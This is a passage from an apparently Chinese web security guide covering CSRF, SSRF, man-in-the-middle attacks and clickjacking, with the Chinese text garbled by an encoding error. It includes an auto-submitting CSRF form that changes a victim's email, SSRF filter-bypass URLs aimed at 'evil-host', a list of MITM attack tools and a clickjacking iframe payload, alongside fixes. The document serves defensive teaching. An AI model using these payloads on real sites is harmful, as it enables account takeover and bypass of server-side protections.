class="line">email=wiener@normal-user.com</span><br></pre></td></tr></table></figure></li><li><p>åœ¨æ»¡è¶³<code>CSRF</code>æ”»å‡»æ¡ä»¶çš„æƒ…å†µä¸‹ï¼Œæ”»å‡»è€…å¯ä»¥æ„å»ºåŒ…å«ä»¥ä¸‹HTMLçš„ç½‘é¡µï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"https://vulnerable-website.com/email/change"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"hidden"</span> <span class="attr">name</span>=<span class="string">"email"</span> <span class="attr">value</span>=<span class="string">"pwned@evil-user.net"</span> /&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">      <span class="built_in">document</span>.forms[<span class="number">0</span>].submit();</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœå—å®³ç”¨æˆ·è®¿é—®æ”»å‡»è€…çš„ç½‘é¡µï¼Œåˆ™ä¼šå‘ç”Ÿä»¥ä¸‹æƒ…å†µï¼š</p></li><li><p>æ”»å‡»è€…çš„é¡µé¢å°†è§¦å‘å¯¹æ˜“å—æ”»å‡»çš„ç½‘ç«™çš„HTTPè¯·æ±‚ã€‚  å¦‚æœç”¨æˆ·ç™»å½•åˆ°æ˜“å—æ”»å‡»çš„ç½‘ç«™ï¼Œåˆ™å…¶æµè§ˆå™¨å°†è‡ªåŠ¨åœ¨è¯·æ±‚ä¸­åŒ…æ‹¬å…¶ä¼šè¯<code>cookie</code>ï¼ˆå‡è®¾æœªä½¿ç”¨<code>SameSite cookie</code>ï¼‰ã€‚  æ˜“å—æ”»å‡»çš„ç½‘ç«™å°†ä»¥æ­£å¸¸æ–¹å¼å¤„ç†è¯·æ±‚ï¼Œå°†å…¶è§†ä¸ºå—å®³ç”¨æˆ·æå‡ºï¼Œå¹¶æ›´æ”¹å…¶ç”µå­é‚®ä»¶åœ°å€ã€‚  </p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p><code>CSRF</code>è‡ªåŠ¨é˜²å¾¡ç­–ç•¥ï¼šåŒæºæ£€æµ‹ï¼ˆ<code>Origin</code>å’Œ <code>Referer</code>éªŒè¯ï¼‰ã€‚</p></li><li><p>åˆ©ç”¨<code>SameSite Cookie</code>å±æ€§ã€‚</p></li><li><p><code>CSRF</code>ä¸»åŠ¨é˜²å¾¡æªæ–½ï¼š<code>Token</code>éªŒè¯æˆ–è€…åŒé‡<code>Cookie</code>éªŒè¯ä»¥åŠé…åˆ<code>Samesite Cookie</code>ã€‚</p></li><li><p>ä¿è¯é¡µé¢çš„å¹‚ç­‰æ€§ï¼Œåç«¯æ¥å£ä¸è¦åœ¨<code>GET</code>é¡µé¢ä¸­åšç”¨æˆ·æ“ä½œã€‚</p></li><li><p>åŸºäºç”¨æˆ·äº¤äº’çš„<code>CSRF</code>é˜²å¾¡ï¼šé‡æ–°è®¤è¯ï¼ˆå¯†ç ï¼‰ã€ä¸€æ¬¡æ€§ä»¤ç‰Œã€éªŒè¯ç ã€‚</p></li></ul><h3 id="æœåŠ¡å™¨ç«¯ä¼ªé€ è¯·æ±‚ï¼ˆSSRFï¼‰"><a href="#æœåŠ¡å™¨ç«¯ä¼ªé€ è¯·æ±‚ï¼ˆSSRFï¼‰" class="headerlink" title="æœåŠ¡å™¨ç«¯ä¼ªé€ è¯·æ±‚ï¼ˆSSRFï¼‰"></a>æœåŠ¡å™¨ç«¯ä¼ªé€ è¯·æ±‚ï¼ˆSSRFï¼‰</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><code>SSRF</code>ï¼ˆ<code>Server-Side Request Forgery</code>ï¼ŒæœåŠ¡ç«¯è¯·æ±‚ä¼ªé€ ï¼‰æ˜¯ä¸€ç§ç”±æ”»å‡»è€…æ„é€ è¯·æ±‚ï¼Œç”±æœåŠ¡ç«¯å‘èµ·çš„è¯·æ±‚çš„å®‰å…¨æ¼æ´ã€‚ä¸€èˆ¬æƒ…å†µä¸‹ï¼Œ<code>SSRF</code>æ”»å‡»çš„ç›®æ ‡æ˜¯å¤–ç½‘æ— æ³•è®¿é—®çš„å†…éƒ¨ç³»ç»Ÿã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>æˆåŠŸåˆ©ç”¨<code>SSRF</code>æ”»å‡»é€šå¸¸ä¼šå¯¼è‡´æ˜“å—æ”»å‡»çš„åº”ç”¨ç¨‹åºæœ¬èº«æˆ–åº”ç”¨ç¨‹åºå¯ä»¥ä¸ä¹‹é€šä¿¡çš„å…¶ä»–åç«¯ç³»ç»Ÿä¸Šæœªç»æˆæƒçš„æ“ä½œæˆ–å¯¹ç»„ç»‡å†…æ•°æ®çš„è®¿é—®ã€‚åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œ<code>SSRF</code>æ¼æ´å¯èƒ½å…è®¸æ”»å‡»è€…æ‰§è¡Œä»»æ„å‘½ä»¤æ‰§è¡Œã€‚</p></li><li><p>å¯¼è‡´ä¸å¤–éƒ¨ç¬¬ä¸‰æ–¹ç³»ç»Ÿå»ºç«‹è¿æ¥çš„<code>SSRF</code>åˆ©ç”¨å¯èƒ½å¯¼è‡´æ¶æ„çš„ç»§ç»­æ”»å‡»ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>ç¦æ­¢è·³è½¬ã€‚</p></li><li><p>è¿‡æ»¤è¿”å›ä¿¡æ¯ï¼ŒéªŒè¯è¿œç¨‹æœåŠ¡å™¨å¯¹è¯·æ±‚çš„å“åº”æ˜¯æ¯”è¾ƒå®¹æ˜“çš„æ–¹æ³•ã€‚å¦‚æœ<code>Web</code>åº”ç”¨æ˜¯å»è·å–æŸä¸€ç§ç±»å‹çš„æ–‡ä»¶ã€‚é‚£ä¹ˆåœ¨æŠŠè¿”å›ç»“æœå±•ç¤ºç»™ç”¨æˆ·ä¹‹å‰å…ˆéªŒè¯è¿”å›çš„ä¿¡æ¯æ˜¯å¦ç¬¦åˆæ ‡å‡†ã€‚</p></li><li><p>ç¦ç”¨ä¸éœ€è¦çš„åè®®ï¼Œä»…ä»…å…è®¸<code>http</code>å’Œ<code>https</code>è¯·æ±‚ã€‚å¯ä»¥é˜²æ­¢ç±»ä¼¼äº<code>file://</code>, <code>gopher://</code>, <code>ftp://</code> ç­‰å¼•èµ·çš„é—®é¢˜</p></li><li><p>è®¾ç½®<code>URL</code>ç™½åå•æˆ–è€…é™åˆ¶å†…ç½‘<code>IP</code>ï¼ˆä½¿ç”¨<code>gethostbyname()</code>åˆ¤æ–­æ˜¯å¦ä¸ºå†…ç½‘<code>IP</code>ï¼‰</p></li><li><p>é™åˆ¶è¯·æ±‚çš„ç«¯å£ä¸º<code>http</code>å¸¸ç”¨çš„ç«¯å£ï¼Œæ¯”å¦‚ <code>80</code>ã€<code>443</code>ã€<code>8080</code>ã€<code>8090</code></p></li><li><p>ç»Ÿä¸€é”™è¯¯ä¿¡æ¯ï¼Œé¿å…ç”¨æˆ·å¯ä»¥æ ¹æ®é”™è¯¯ä¿¡æ¯æ¥åˆ¤æ–­è¿œç«¯æœåŠ¡å™¨çš„ç«¯å£çŠ¶æ€ã€‚</p></li><li><p>é»‘åå•è¿‡æ»¤å™¨ï¼š</p><p>é˜»æ­¢åŒ…å«ä¸»æœºåï¼ˆå¦‚<code>127.0.0.1</code>å’Œ<code>localhost</code>ï¼‰ã€‚</p><p>é˜»æ­¢å†…ç½‘åœ°å€çš„è®¿é—®ï¼ˆå¦‚<code>192.168.x.x/10.x.x.x</code>ç­‰ï¼‰ã€‚</p><p>ä½¿ç”¨<code>URL</code>ç¼–ç æˆ–å¤§å°å†™å˜åŒ–å¯¹é˜»å¡çš„å­—ç¬¦ä¸²è¿›è¡Œæ··æ·†ã€‚</p></li><li><p>ç™½åå•è¿‡æ»¤å™¨ï¼š</p><p>ä½¿ç”¨@å­—ç¬¦åœ¨ä¸»æœºåä¹‹å‰çš„<code>URL</code>ä¸­åµŒå…¥å‡­æ®ã€‚ä¾‹å¦‚ï¼š<code>https://expected-host@evil-host</code>ã€‚</p><p>ä½¿ç”¨è¯¥<code>#</code>å­—ç¬¦æ¥æŒ‡ç¤º<code>URL</code>ç‰‡æ®µã€‚ä¾‹å¦‚ï¼š<code>https://evil-host#expected-host</code>ã€‚</p><p>åˆ©ç”¨DNSå‘½åå±‚æ¬¡ç»“æ„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥æ‚¨æ§åˆ¶çš„æ ‡å‡†<code>DNS</code>åç§°ä¸­ã€‚ä¾‹å¦‚ï¼š<code>https://expected-host.evil-host</code>ã€‚</p><p>ä½¿ç”¨<code>URL</code>ç¼–ç å­—ç¬¦æ¥æ··æ·†<code>URL</code>è§£æä»£ç ã€‚å¦‚æœå®ç°è¿‡æ»¤å™¨çš„ä»£ç ä¸æ‰§è¡Œåç«¯<code>HTTP</code>è¯·æ±‚çš„ä»£ç ä»¥ä¸åŒçš„æ–¹å¼å¤„ç†<code>URL</code>ç¼–ç çš„å­—ç¬¦ï¼Œåˆ™è¿™ç‰¹åˆ«æœ‰ç”¨ã€‚</p></li></ul><h3 id="ä¸­é—´äººæ”»å‡»"><a href="#ä¸­é—´äººæ”»å‡»" class="headerlink" title="ä¸­é—´äººæ”»å‡»"></a>ä¸­é—´äººæ”»å‡»</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li><p>ä¸­é—´äººæ”»å‡»ï¼ˆ<code>Man-in-the-Middle Attack</code>, <code>MITM</code>ï¼‰æ˜¯ä¸€ç§ç”±æ¥å·²ä¹…çš„ç½‘ç»œå…¥ä¾µæ‰‹æ®µï¼Œå¹¶ä¸”å½“ä»Šä»ç„¶æœ‰ç€å¹¿æ³›çš„å‘å±•ç©ºé—´ï¼Œå¦‚<code>SMB</code>ä¼šè¯åŠ«æŒã€<code>DNS</code>æ¬ºéª—ç­‰æ”»å‡»éƒ½æ˜¯å…¸å‹çš„<code>MITM</code>æ”»å‡»ã€‚ç®€è€Œè¨€ä¹‹ï¼Œæ‰€è°“çš„<code>MITM</code>æ”»å‡»å°±æ˜¯é€šè¿‡æ‹¦æˆªæ­£å¸¸çš„ç½‘ç»œé€šä¿¡æ•°æ®ï¼Œå¹¶è¿›è¡Œæ•°æ®ç¯¡æ”¹å’Œå—…æ¢ï¼Œè€Œé€šä¿¡çš„åŒæ–¹å´æ¯«ä¸çŸ¥æƒ…ã€‚å½“é»‘å®¢å°†è‡ªå·±æ’å…¥å®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨çš„é€šä¿¡ä¹‹é—´æ—¶ï¼Œå°±ä¼šå‘ç”Ÿ<code>MitM</code>æ”»å‡»ã€‚</p></li><li><p>ä¸­é—´äººæ”»å‡»å¸¸è§ç±»åˆ«ï¼š<code>IP</code>æ¬ºéª—ã€<code>DNS</code>æ¬ºéª—ã€<code>ARP</code>æ¬ºéª—ã€<code>HTTPS</code>æ¬ºéª—ã€<code>SSL</code>åŠ«æŒã€<code>DNS</code>åŠ«æŒã€ç”µå­é‚®ä»¶åŠ«æŒã€<code>WIFI</code>çªƒå¬ã€çªƒå–æµè§ˆå™¨<code>Cookie</code>ã€<code>SSL</code>å‰¥ç¦»ã€‚</p></li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li><p>ä¸€æ—¦æ”»å‡»è€…æ‰¾åˆ°äº†æ˜“å—æ”»å‡»çš„è·¯ç”±å™¨ï¼Œä»–ä»¬ä¾¿å¯ä»¥éƒ¨ç½²å·¥å…·æ¥æ‹¦æˆªå’Œè¯»å–å—å®³è€…çš„ä¼ è¾“æ•°æ®ã€‚ç„¶åï¼Œæ”»å‡»è€…è¿˜å¯ä»¥å°†å…¶å·¥å…·æ’å…¥å—å®³è€…çš„è®¡ç®—æœºå’Œç”¨æˆ·è®¿é—®çš„ç½‘ç«™ä¹‹é—´ï¼Œä»¥æ•è·ç™»å½•å‡­æ®ï¼Œé“¶è¡Œä¿¡æ¯å’Œå…¶ä»–ä¸ªäººä¿¡æ¯ã€‚</p></li><li><p>æˆåŠŸåˆ©ç”¨ä¸­é—´äººæ”»å‡»çš„æ”»å‡»è€…å¯ä»¥çªƒå–ç”¨æˆ·çš„æ•æ„Ÿä¿¡æ¯ã€æŒ‚é©¬ç­‰ã€‚</p></li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä¼šè¯åŠ«æŒï¼š</p><p>åœ¨è¿™ç§<code>MitM</code>æ”»å‡»ä¸­ï¼Œæ”»å‡»è€…åŠ«æŒäº†å—ä¿¡ä»»çš„å®¢æˆ·ç«¯å’Œç½‘ç»œæœåŠ¡å™¨ä¹‹é—´çš„ä¼šè¯ã€‚å½“æœåŠ¡å™¨ç»§ç»­ä¼šè¯æ—¶ï¼Œæ”»å‡»è®¡ç®—æœºå°†å…¶<code>IP</code>åœ°å€æ›¿æ¢ä¸ºå—ä¿¡ä»»çš„å®¢æˆ·ç«¯ï¼Œè®¤ä¸ºå®ƒæ­£åœ¨ä¸å®¢æˆ·ç«¯è¿›è¡Œé€šä¿¡ã€‚ä¾‹å¦‚ï¼Œæ”»å‡»å¯èƒ½ä¼šåƒè¿™æ ·å±•å¼€ï¼š</p><p>1.å®¢æˆ·ç«¯è¿æ¥åˆ°æœåŠ¡å™¨ã€‚</p><p>2.æ”»å‡»è€…çš„è®¡ç®—æœºæ§åˆ¶äº†å®¢æˆ·ç«¯ã€‚</p><p>3.æ”»å‡»è€…çš„è®¡ç®—æœºå°†å®¢æˆ·ç«¯ä¸æœåŠ¡å™¨æ–­å¼€è¿æ¥ã€‚</p><p>4.æ”»å‡»è€…çš„è®¡ç®—æœºç”¨å…¶è‡ªå·±çš„<code>IP</code>åœ°å€æ›¿æ¢å®¢æˆ·ç«¯çš„<code>IP</code>åœ°å€ï¼Œå¹¶æ¬ºéª—å®¢æˆ·ç«¯çš„åºåˆ—å·ã€‚</p><p>5.æ”»å‡»è€…çš„è®¡ç®—æœºç»§ç»­ä¸æœåŠ¡å™¨å¯¹è¯ï¼Œå¹¶ä¸”æœåŠ¡å™¨è®¤ä¸ºæœåŠ¡å™¨ä»åœ¨ä¸å®¢æˆ·ç«¯é€šä¿¡ã€‚</p><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>ä¸­é—´äººæ”»å‡»å¸¸è§æ”»å‡»å·¥å…·ï¼š</p><p><code>dsniff</code> â€”â€” ä¸€ä¸ªå®ç°<code>SSH</code>å’Œ<code>SSL</code>ä¸­é—´äººæ”»å‡»çš„å·¥å…·</p><p><code>Cain and Abel</code> â€”â€”  <code>Windows</code>å›¾å½¢ç•Œé¢çš„å·¥å…·ï¼Œå®ƒå¯ä»¥æ‰§è¡Œä¸­é—´äººæ”»å‡»ï¼Œå—…æ¢å’Œ<code>ARP</code>æŠ•æ¯’</p><p><code>Ettercap</code> â€”â€”  ä¸€ä¸ªåŸºäºå±€åŸŸç½‘çš„ä¸­é—´äººæ”»å‡»å·¥å…·</p><p><code>Karma</code> â€”â€” ä¸€ä¸ªä½¿ç”¨<code>802.11 Evil Twin</code>ä»¥æ‰§è¡Œ<code>MITM</code>æ”»å‡»çš„å·¥å…·</p><p><code>AirJack</code> â€”â€” ä¸€ä¸ªæ¼”ç¤º<code>802.11 MITM</code>æ”»å‡»çš„å·¥å…·</p><p><code>SSLStrip</code>â€”â€” ä¸€ä¸ªåŸºäº<code>SSL</code>çš„<code>MITM</code>æ”»å‡»çš„å·¥å…·</p><p><code>SSLSniff</code>â€”â€” ä¸€ä¸ªåŸºäº<code>SSL</code>çš„<code>MITM</code>æ”»å‡»çš„å·¥å…·ã€‚åŸæœ¬æ˜¯åˆ©ç”¨ä¸€ä¸ªåœ¨<code>Internet Explorer</code>ä¸Šç¼ºé™·å®ç°çš„ã€‚</p><p><code>csploit</code> â€”â€” ä¸€ä¸ªåœ¨<code>android</code>ç³»ç»Ÿä¸Šå®ç°çš„<code>MITM</code>æ”»å‡»å·¥å…·åŒ…ã€‚</p><p><code>Mallory</code> â€”â€”  ä¸€ä¸ªé€æ˜çš„<code>TCP</code>å’Œ<code>UDP MiTMing</code>ä»£ç†ã€‚æ‰©å±•åˆ°<code>MITM SSL</code>ï¼Œ<code>SSH</code>å’Œè®¸å¤šå…¶ä»–åè®®ã€‚</p><p><code>wsniff</code> â€”â€”  ä¸€ä¸ª<code>802.11 HTTP/HTTPS</code>çš„åŸºäº<code>MITM</code>æ”»å‡»çš„å·¥å…·</p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>æ¥å…¥æ›´å®‰å…¨çš„åŠ å¯†åè®®<code>WEP/WAP</code>çš„æ— çº¿ç½‘ç»œ</p><p>æ— çº¿è®¿é—®ç‚¹å…·æœ‰å¼ºå¤§çš„åŠ å¯†æœºåˆ¶ï¼Œå¯ä»¥é˜²æ­¢æœ‰å®³ç”¨æˆ·ä»…åœ¨é™„è¿‘å°±å¯ä»¥åŠ å…¥æ‚¨çš„ç½‘ç»œã€‚å¼±çš„åŠ å¯†æœºåˆ¶å¯ä»¥ä½¿æ”»å‡»è€…ä»¥æš´åŠ›æ–¹å¼è¿›å…¥ç½‘ç»œå¹¶å¼€å§‹ä¸­é—´äººæ”»å‡»ã€‚åŠ å¯†å®æ–½è¶Šå¼ºï¼Œå°±è¶Šå®‰å…¨ã€‚</p></li><li><p>è®¾ç½®æ›´å®‰å…¨çš„è·¯ç”±å™¨ç™»å½•å‡­è¯ </p><p>ç¡®ä¿æ›´æ”¹é»˜è®¤è·¯ç”±å™¨ç™»å½•åã€‚ä¸ä»…æ˜¯<code>Wi-Fi</code>å¯†ç ï¼Œè¿˜æœ‰è·¯ç”±å™¨ç®¡ç†ç•Œé¢çš„ç™»å½•å‡­æ®ã€‚å¦‚æœæ”»å‡»è€…æ‰¾åˆ°äº†è·¯ç”±å™¨ç™»å½•å‡­æ®ï¼Œåˆ™ä»–ä»¬å¯ä»¥å°†<code>DNS</code>æœåŠ¡å™¨æ›´æ”¹ä¸ºæ¶æ„æœåŠ¡å™¨ã€‚ç”šè‡³ä½¿ç”¨æ¶æ„è½¯ä»¶æ„ŸæŸ“è·¯ç”±å™¨ã€‚</p></li><li><p>ä½¿ç”¨è™šæ‹Ÿä¸“ç”¨ç½‘</p><p><code>VPN</code>å¯ç”¨äºä¸ºå±€åŸŸç½‘å†…çš„æ•æ„Ÿä¿¡æ¯åˆ›å»ºå®‰å…¨çš„ç¯å¢ƒã€‚ä»–ä»¬ä½¿ç”¨åŸºäºå¯†é’¥çš„åŠ å¯†æ¥åˆ›å»ºç”¨äºå®‰å…¨é€šä¿¡çš„å­ç½‘ã€‚è¿™æ ·ï¼Œå³ä½¿æ”»å‡»è€…ç¢°å·§è¿›å…¥å…±äº«çš„ç½‘ç»œï¼Œä»–ä¹Ÿå°†æ— æ³•ç ´è¯‘<code>VPN</code>ä¸­çš„æµé‡ã€‚</p></li><li><p>å¼ºåˆ¶ä½¿ç”¨<code>HTTPS</code></p><p><code>HTTPS</code>å¯ç”¨äºä½¿ç”¨å…¬ç§å¯†é’¥äº¤æ¢é€šè¿‡<code>HTTP</code>å®‰å…¨åœ°è¿›è¡Œé€šä¿¡ã€‚è¿™æ ·å¯ä»¥é˜²æ­¢æ”»å‡»è€…åˆ©ç”¨å®ƒæ­£åœ¨å—…æ¢çš„æ•°æ®ã€‚ç½‘ç«™åº”ä»…ä½¿ç”¨<code>HTTPS</code>ï¼Œè€Œä¸åº”æä¾›<code>HTTP</code>æ›¿ä»£æ–¹æ³•ã€‚ç”¨æˆ·å¯ä»¥å®‰è£…æµè§ˆå™¨æ’ä»¶ä»¥å§‹ç»ˆå¯¹è¯·æ±‚ä½¿ç”¨<code>HTTPS</code>æ¥å¼ºåˆ¶å®æ–½ã€‚</p></li><li><p>åŸºäºå…¬é’¥å¯¹çš„èº«ä»½éªŒè¯</p><p>ä¸­é—´äººæ”»å‡»é€šå¸¸æ¶‰åŠæ¬ºéª—æŸç‰©æˆ–å¦ä¸€ç‰©ã€‚å¯ä»¥åœ¨å †æ ˆçš„å„ä¸ªå±‚ä¸­ä½¿ç”¨åŸºäºå…¬å…±å¯†é’¥å¯¹çš„èº«ä»½éªŒè¯ï¼ˆä¾‹å¦‚<code>RSA</code>ï¼‰ï¼Œä»¥å¸®åŠ©ç¡®ä¿æ­£åœ¨ä¸ä¹‹é€šä¿¡çš„å¯¹è±¡æ˜¯å¦ç¡®å®æ˜¯è¦ä¸ä¹‹é€šä¿¡çš„å¯¹è±¡ã€‚</p></li></ul><h3 id="ç‚¹å‡»åŠ«æŒ"><a href="#ç‚¹å‡»åŠ«æŒ" class="headerlink" title="ç‚¹å‡»åŠ«æŒ"></a>ç‚¹å‡»åŠ«æŒ</h3><p><strong>æ¼æ´æè¿°</strong></p><ul><li>ç‚¹å‡»åŠ«æŒï¼ˆ<code>Click Jacking</code>ï¼‰æ˜¯ä¸€ç§è§†è§‰ä¸Šçš„æ¬ºéª—æ‰‹æ®µï¼Œæ”»å‡»è€…é€šè¿‡ä½¿ç”¨ä¸€ä¸ªé€æ˜çš„<code>iframe</code>ï¼Œè¦†ç›–åœ¨ä¸€ä¸ªç½‘é¡µä¸Šï¼Œç„¶åè¯±ä½¿ç”¨æˆ·åœ¨è¯¥é¡µé¢ä¸Šè¿›è¡Œæ“ä½œï¼Œé€šè¿‡è°ƒæ•´<code>iframe</code>é¡µé¢çš„ä½ç½®ï¼Œå¯ä»¥ä½¿å¾—ä¼ªé€ çš„é¡µé¢æ°å¥½å’Œ<code>iframe</code>é‡Œå—å®³é¡µé¢é‡Œä¸€äº›åŠŸèƒ½é‡åˆï¼ˆæŒ‰é’®ï¼‰ï¼Œä»¥è¾¾åˆ°çªƒå–ç”¨æˆ·ä¿¡æ¯æˆ–è€…åŠ«æŒç”¨æˆ·æ“ä½œçš„ç›®çš„ã€‚</li></ul><p><strong>æ¼æ´å±å®³</strong></p><ul><li>æˆåŠŸåˆ©ç”¨æ­¤æ¼æ´æ”»å‡»è€…å¯ä»¥çªƒå–ç”¨æˆ·æ•æ„Ÿä¿¡æ¯ã€‚</li></ul><p><strong>æ”»å‡»æ¡ˆä¾‹</strong></p><p>åœºæ™¯1ï¼šä»<code>Google Chrome 4.0</code>å’Œ<code>IE8</code>å¼€å§‹ï¼Œå¼•å…¥äº†<code>XSS</code>è¿‡æ»¤å™¨ï¼Œä»¥ä¿æŠ¤ç”¨æˆ·å…å—åå°„çš„<code>XSS</code>æ”»å‡»ã€‚<code>Nava</code>å’Œ<code>Lindsay</code>å·²ç»è§‚å¯Ÿåˆ°ï¼Œè¿™ç±»è¿‡æ»¤å™¨å¯ä»¥ä¼ªè£…æˆæ¶æ„ä»£ç ï¼Œä»è€Œç”¨äºåœç”¨å¸§æ— æ•ˆä»£ç ã€‚</p><p>ç¤ºä¾‹ï¼šç›®æ ‡ç½‘é¡µæ¡†æ¶æ— æ•ˆä»£ç ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">if</span> ( top != self )</span></span><br><span class="line"><span class="undefined">    &#123;</span></span><br><span class="line"><span class="undefined">        top.location=self.location;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure><p>æ”»å‡»è€…ä»£ç ï¼š</p><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=â€http://target.com/?param=&lt;script&gt;ifâ€&gt;</span><br></pre></td></tr></table></figure><p><strong>æ£€æµ‹æ–¹æ³•</strong></p><ul><li><p>æµ‹è¯•äººå‘˜å¯ä»¥é€šè¿‡åˆ›å»ºä¸€ä¸ªç®€å•çš„ç½‘é¡µï¼ˆåŒ…æ‹¬åŒ…å«ç›®æ ‡ç½‘é¡µçš„æ¡†æ¶ï¼‰æ¥æµ‹è¯•ç›®æ ‡ç½‘é¡µæ˜¯å¦å¯ä»¥åŠ è½½åˆ°åµŒå…¥å¼æ¡†æ¶ä¸­ã€‚ä»¥ä¸‹ä»£ç æ®µæ˜¾ç¤ºäº†ç”¨äºåˆ›å»ºæ­¤æµ‹è¯•ç½‘é¡µçš„<code>HTML</code>ä»£ç ç¤ºä¾‹ï¼š</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">title</span>&gt;</span>Clickjack test page<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">iframe</span> <span class="attr">src</span>=<span class="string">"http://www.target.site"</span> <span class="attr">width</span>=<span class="string">"500"</span> <span class="attr">height</span>=<span class="string">"500"</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></li><li><p>å¦‚æœå°†<code>http://www.target.site</code>é¡µé¢æˆåŠŸåŠ è½½åˆ°æ¡†æ¶ä¸­ï¼Œåˆ™è¯¥ç«™ç‚¹å®¹æ˜“å—åˆ°æ”»å‡»ï¼Œå¹¶ä¸”æ²¡æœ‰é’ˆå¯¹ç‚¹å‡»åŠ«æŒæ”»å‡»çš„ä¿æŠ¤æªæ–½ã€‚</p></li><li><p><code>OWASP</code>æ£€æµ‹æ–¹æ³•ï¼š</p><p><code>https://owasp.org/www-project-Web-security-testing-guide/latest/4-Web_Application_Security_Testing/11-Client-side_Testing/09-Testing_for_Clickjacking.html</code></p></li></ul><p><strong>ä¿®å¤å»ºè®®</strong></p><ul><li><p>å¯ä»¥ä½¿ç”¨ä¸‰ç§ä¸»è¦æœºåˆ¶æ¥é˜²å¾¡è¿™äº›æ”»å‡»ï¼š</p><p>ç¦æ­¢æµè§ˆå™¨ä½¿ç”¨<code>X-Frame-Options</code>æˆ–å†…å®¹å®‰å…¨ç­–ç•¥(<code>frame-ancestors</code>) <code>HTTP</code>æ ‡å¤´åœ¨æ¡†æ¶ä¸­åŠ è½½é¡µé¢ã€‚</p><p>ä½¿ç”¨<code>SameSite cookie</code>å±æ€§å°†é¡µé¢åŠ è½½åˆ°æ¡†æ¶ä¸­æ—¶ï¼Œé˜²æ­¢åŒ…å«ä¼šè¯<code>cookie</code> ã€‚</p><p>åœ¨é¡µé¢ä¸­å®ç°<code>JavaScript</code>ä»£ç ä»¥å°è¯•é˜²æ­¢å°†å…¶åŠ è½½åˆ°æ¡†æ¶ä¸­ã€‚</p></li><li><p>åŸºäºå†…å®¹å®‰å…¨ç­–ç•¥ï¼ˆ<code>CSP</code>ï¼‰é˜²æ­¢ç‚¹å‡»åŠ«æŒï¼Œä»¥ä¸‹<code>CSP</code>ä»…å°†æ¡†æ¶åˆ—å…¥ç™½åå•ï¼š</p><p>ä¸ºäº†é˜²æ­¢å†…å®¹çš„æ‰€æœ‰æ¡†æ¶ä½¿ç”¨ï¼š</p><p>  <code>Content-Security-Policy: frame-ancestors  &#39;none&#39;;</code></p><p>è¦å…è®¸ç½‘ç«™æœ¬èº«ä½¿ç”¨ï¼Œè¯·ä½¿ç”¨ï¼š</p><p>  <code>Content-Security-Policy: frame-ancestors  &#39;self&#39;;</code></p><p>è¦å…è®¸ä¿¡ä»»åŸŸï¼Œè¯·æ‰§è¡Œä»¥ä¸‹æ“ä½œï¼š</p><p>  <code>Content-Security-Policy: frame-ancestors  trusted.com;</code></p></li></ul>]]></content>
    
    <summary type="html">
    
